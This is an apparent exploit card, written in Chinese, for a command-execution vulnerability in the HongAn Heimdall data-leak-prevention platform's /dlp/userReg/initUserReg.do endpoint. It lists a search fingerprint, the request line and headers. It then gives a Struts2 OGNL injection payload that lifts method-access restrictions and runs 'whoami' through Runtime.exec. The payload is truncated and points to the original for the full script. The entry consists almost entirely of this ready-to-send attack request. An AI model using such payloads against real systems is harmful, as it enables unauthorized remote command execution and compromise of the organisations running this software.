# 虹安信息数据泄露防护平台initUserReg存在命令执行漏洞

- **系统**：虹安信息数据泄露防护平台　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`product="HongAn-Heimdall-DLP"`
- **请求**：`POST /dlp/userReg/initUserReg.do HTTP/1.1`
- **关键头**：`Content-type: application/x-www-form-urlencoded`　`Content-Length: 667`

**请求体 / payload**
```
('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'whoami\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@get…（脚本共 667 字，完整版见原文）
```
- **预期**：200　|　—